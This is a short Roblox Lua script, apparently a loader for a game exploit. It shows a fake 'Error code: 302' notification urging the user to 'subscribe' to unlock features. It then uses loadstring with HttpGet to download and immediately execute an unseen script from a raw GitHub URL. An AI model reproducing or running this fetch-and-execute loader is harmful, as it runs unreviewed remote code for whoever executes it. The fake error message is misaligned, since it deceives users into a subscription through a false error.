--// Notification Script
local StarterGui = game:GetService("StarterGui")

StarterGui:SetCore("SendNotification", {
	Title = "Error code: 302";
	Text = "Subscribe for 2-3 days to UNLOCK Full potential";
	Duration = 10; -- how long it stays on screen
})

wait(1)

loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Scripty/refs/heads/main/DuaI.lua"))()
